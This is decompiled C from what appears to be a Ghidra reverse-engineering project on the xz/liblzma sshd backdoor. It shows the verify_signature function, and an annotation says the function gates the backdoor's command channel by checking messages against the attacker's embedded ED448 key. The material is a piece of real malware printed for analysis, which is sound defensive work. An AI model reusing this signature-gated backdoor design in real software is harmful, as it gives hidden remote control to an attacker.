// /home/kali/xzre-ghidra/xzregh/107630_verify_signature.c
// Function: verify_signature @ 0x107630
// Calling convention: unknown
// Prototype: undefined verify_signature(void)


/*
 * AutoDoc: Computes the host-key hash, loads the attacker’s ED448 public key, and runs EVP_DigestVerify on the supplied signature. This gate keeps the backdoor command channel—only messages signed with the embedded ED448 key reach the executor.
 */
#include "xzre_types.h"


undefined8
verify_signature(int *param_1,long param_2,ulong param_3,ulong param_4,undefined8 param_5,
                long param_6,long param_7)

{
  ulong uVar1;
  long lVar2;
  int iVar3;
  uint uVar4;
  undefined8 uVar5;
  undefined8 uVar6;
  ulong uVar7;
  ulong uVar8;
  long lVar9;
  long lVar10;
  undefined4 *puVar11;
  undefined8 local_c1;
  undefined8 uStack_b9;
  undefined4 local_b1 [32];
  
  if (param_1 == (int *)0x0) {
    return 0;
  }
  if (param_2 == 0) {
    return 0;
  }
  if (param_4 == 0) {
    return 0;
  }
  if (0xffffffffffffffde < param_3) {
    return 0;
  }
  uVar1 = param_3 + 0x20;
  if (param_7 == 0) {
    return 0;
  }
  if (param_4 < uVar1) {
    return 0;
  }
  lVar2 = *(long *)(param_7 + 8);
  if (lVar2 == 0) {
    return 0;
  }
  iVar3 = *param_1;
  if (iVar3 == 2) {
    lVar9 = *(long *)(param_1 + 8);
    local_c1 = 0;
    uStack_b9 = 0;
    puVar11 = local_b1;
    for (lVar10 = 0x79; lVar10 != 0; lVar10 = lVar10 + -1) {
      *(BOOL *)puVar11 = param_4 < uVar1;
      puVar11 = (undefined4 *)((long)puVar11 + 1);
    }
    if (lVar9 == 0) {
      return 0;
    }
    if (*(code **)(lVar2 + 0x48) == (code *)0x0) {
      return 0;
    }
    if (*(long *)(lVar2 + 0x50) == 0) {
      return 0;
    }
    if (*(long *)(lVar2 + 0x40) == 0) {
      return 0;
    }
    uVar5 = (**(code **)(lVar2 + 0x48))(lVar9);
    uVar6 = (**(code **)(lVar2 + 0x50))(lVar9);
    uVar7 = (**(code **)(lVar2 + 0x40))(uVar6,uVar5,4,0,0,0);
    if (0x85 < uVar7) {
      return 0;
    }
    uVar4 = (uint)uVar7;
    local_c1 = CONCAT44(local_c1._4_4_,
                        uVar4 >> 0x18 | (uVar4 & 0xff0000) >> 8 | (uVar4 & 0xff00) << 8 |
                        uVar4 << 0x18);
    uVar8 = (**(code **)(lVar2 + 0x40))(uVar6,uVar5,4,(long)&local_c1 + 4,uVar7,0);
    if (uVar7 != uVar8) {
      return 0;
    }
    lVar9 = uVar7 + 4;
  }
  else {
    if (iVar3 < 3) {
      if (iVar3 == 0) {
        iVar3 = rsa_key_hash(*(undefined8 *)(param_1 + 2),param_2 + param_3,param_4 - param_3,lVar2)
        ;
      }
      else {
        if (iVar3 != 1) {
          return 0;
        }
        iVar3 = dsa_key_hash(*(undefined8 *)(param_1 + 4),param_2 + param_3,param_4 - param_3,
                             param_7);
      }
      goto LAB_001076f8;
    }
    if (iVar3 != 3) {
      return 0;
    }
    lVar9 = *(long *)(param_1 + 0xc);
    uStack_b9 = 0;
    puVar11 = local_b1;
    for (lVar10 = 5; lVar10 != 0; lVar10 = lVar10 + -1) {
      *puVar11 = 0;
      puVar11 = puVar11 + 1;
    }
    if (lVar9 == 0) {
      return 0;
    }
    local_c1 = 0x20000000;
    lVar10 = 0;
    do {
      *(undefined1 *)((long)&local_c1 + lVar10 + 4) = *(undefined1 *)(lVar9 + lVar10);
      lVar10 = lVar10 + 1;
    } while (lVar10 != 0x20);
    lVar9 = 0x24;
  }
  iVar3 = sha256(&local_c1,lVar9,param_2 + param_3,param_4 - param_3,lVar2);
LAB_001076f8:
  if ((((iVar3 != 0) && (lVar2 = *(long *)(param_7 + 8), lVar2 != 0)) &&
      (iVar3 = contains_null_pointers(lVar2 + 0x70,6), iVar3 == 0)) &&
     ((param_6 != 0 && (lVar9 = (**(code **)(lVar2 + 0x70))(0x440,0,param_6,0x39), lVar9 != 0)))) {
    lVar10 = (**(code **)(lVar2 + 0x78))();
    if (lVar10 != 0) {
      iVar3 = (**(code **)(lVar2 + 0x80))(lVar10,0,0,0,lVar9);
      if ((iVar3 == 1) &&
         (iVar3 = (**(code **)(lVar2 + 0x88))(lVar10,param_5,0x72,param_2,uVar1), iVar3 == 1)) {
        (**(code **)(lVar2 + 0x90))(lVar10);
        (**(code **)(lVar2 + 0x98))(lVar9);
        return 1;
      }
      (**(code **)(lVar2 + 0x90))(lVar10);
    }
    (**(code **)(lVar2 + 0x98))(lVar9);
  }
  return 0;
}

